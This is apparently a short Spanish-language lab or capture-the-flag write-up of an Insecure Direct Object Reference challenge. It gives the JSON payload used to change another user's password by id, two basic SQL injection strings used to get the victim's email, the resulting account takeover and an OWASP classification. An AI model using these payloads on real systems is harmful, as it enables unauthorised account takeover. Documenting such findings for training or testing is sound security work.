**Reto: Insecure Direct Object Reference (IDOR)**

Payload de cambio de contraseña (via Burp Repeater):

  {"id":"1", "newPassword":"<contraseña>", "confirmNewPassword":"<contraseña>"}

Payload SQLi reutilizado para obtener el email del usuario víctima:

  "value":"hello' or '1'='1"

  "authlevel":"' or '1'='1"

Resultado: Se logró cambiar la contraseña del usuario con id=1 (Naida Dotson) 
sin autorización, y posteriormente iniciar sesión exitosamente con sus credenciales.

Clasificación OWASP: A01:2021 - Broken Access Control (Insecure Direct Object Reference)
Impacto: Cualquier usuario autenticado puede tomar control de la cuenta de 
cualquier otro usuario del sistema, simplemente adivinando/iterando su ID numérico.
